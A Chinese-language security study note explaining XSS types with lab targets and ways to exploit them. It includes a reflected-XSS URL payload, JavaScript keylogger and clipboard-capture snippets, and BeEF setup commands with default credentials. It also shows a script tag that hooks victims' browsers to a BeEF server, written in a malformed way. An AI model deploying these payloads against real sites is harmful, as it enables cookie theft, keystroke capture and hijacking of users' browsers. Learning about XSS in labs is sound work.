跨站脚本XSS
=========================================

#### 背景

- 常见的Web 漏洞中，XSS（Cross-site Script，跨站脚本）漏洞无疑是最多见的。
- 根据 HackerOne 漏洞奖励平台发布的 The 2020 Hacker Report，XSS 漏洞类型占所有报告漏洞中的 23％，排名第一。
- 跨站脚本（Cross-site Script），按理应该简称为 CSS，但为了与层叠样式表（CSS）区分开，特意改为 XSS。

#### 原理

- 指的是网站对用户输入数据未做有效过滤，攻击者可以将恶意脚本注入网站页面中，达到执行恶意代码的目的。
- 攻击者只需要诱使受害者打开特定的网址，就可以在受害者的浏览器中执行被注入的恶意代码。
- 从而窃取用户身份，执行一些敏感操作，或是进行其他的危害行为。
	
#### 分类

- 通常XSS分为存储型和反射型，但还有一种比较特殊的DOM型XSS，它本身属于反射型 XSS。
- 因此，按3种类型划分：反射型、存储型、DOM型
1. 反射型
	- 反射型XSS又被称为非持久型跨站脚本，它是将攻击代码放在URL参数中，而不是存储到服务器，因此需要诱使用户点击才能触发攻击。
	`例如：https://www.xxx.com/?name=<script>alert('wahaha')</script>`
	- 靶场：DVWA
2. 存储型
	- 又被称为持久型跨站脚本。攻击者将恶意代码存储到服务器上，只要诱使受害者访问被插入恶意代码的页面即可触发。
	- 存储型 XSS 经常出现在一些可以发表评论的地方，如帖子、博客。
	- 存储型 XSS 的特点就是不需要在诱使用户访问的URL中包含攻击代码，因为它已经存储到了服务器中，只需要让用户访问包含输出攻击代码的页面即可
	- 靶场：DVWA
3. DOM型
	- 基于文档对象模型（Document Object Model，DOM，用于将Web页面与脚本语言链接起来的标准编程接口）的一种漏洞，它不经过服务端，而是通过URL传入参数去触发，因此也属于反射型 XSS。
	- 由于客户端的 JavaScript 可以访问浏览器页面中的 DOM 对象，因此它能够决定如何处理当前页面的 URL，比如获取 URL 中的相关数据进行处理，然后动态更新到页面上。这导致 DOM 型 XSS 的漏洞代码常位于网页的 JavaScript 代码中。
	- 靶场：Pikachu

#### XSS漏洞利用

- 介绍一些关于 XSS 漏洞利用的方法，避免停留在 XSS 只能弹框的思想层面
- XSS漏洞最为常见的两种攻击方式就是窃取Cookie劫持他人的会话、蠕虫攻击
1. 窃取Cookie
	- Cookie 是由服务器提供的存储在客户端的数据，允许 JavaScript 访问，常用于识别用户身份和保存会话等功能。如果 Web 应用程序存在 XSS 漏洞，那么攻击者通过注入恶意 JavaScript 脚本就可以窃取到 Cookie，进而以用户身份执行恶意操作。
	- 通过 document.cookie 就可以访问到 Cookie
	- 当一个网站存在 XSS 时，我们就可以通过执行 document.cookie 获取当前受害者的 cookie，前提是要先诱使受害者访问特定的 URL。
	- 网上也有很多开源的XSS平台用来接收 Cookie，在GitHub搜索就可以找到很多，大多数可以直接通过 Docker 快速安装。
2. 蠕虫攻击
	- XSS 蠕虫的实现正是得益于Ajax 技术的出现，而后者正是 Web2.0 的标志性技术。
	- Ajax（Asynchronous JavaScript and XML，异步 JavaScript 和 XML）是指一种创建交互式网页应用的网页开发技术。
	- 具体讲就是在我们浏览网页，做一些操作时，可以减少浏览器的一些页面重绘操作，避免出现页面抖动、闪现之类的不适体验。
	- Ajax 中的核心技术就是 XMLHttpRequest，它允许 JavaScript 脚本与服务器进行通信，在不刷新页面的情况下，向服务器发送请求或是接收服务器的响应数据。
3. 其他攻击方法
	- 键盘记录
	```
	keys = ""
	document.onkeypress = function(){
	  keys += String.fromCharCode(window.event.keyCode);
	}
	```
	- 在 Chrome 浏览器中使用代码截获剪贴板内容
	```
	document.addEventListener('paste', function (evt) {
	  clipdata = evt.clipboardData || window.clipboardData;
	  console.log(clipdata.getData('text/plain'));
	});
	```
	- 方法还有很多，可以参考XSS攻击框架 BeEF
	```
	$ git clone https://github.com/beefproject/beef
	$ cd beef
	$ sudo docker build -t beef .
	$ sudo docker run -p 3000:3000 -p 6789:6789 -p 61985:61985 -p 61986:61986 --name beef beef
	或者
	docker pull janes/beef
	docker run -itd --name xss --rm -p 3000:3000 janes/beef
	打开链接：http://127.0.0.1:3000/ui/panel/
	账号密码：beef/beef
	```
	- 在漏洞页面插入如下代码进行利用
	```
	<script>http://127.0.0.1:3000/hook.js</script>
	```
	受害者访问后，若利用成功的话，在BeEF管理页面（此处为http://ip:3000/ui/panel）就可以看到目标上线了。
	刚运行的时候，BeEF 会生成随机密码，账号为 beef；也可以修改 config.yaml 中的账号密码再运行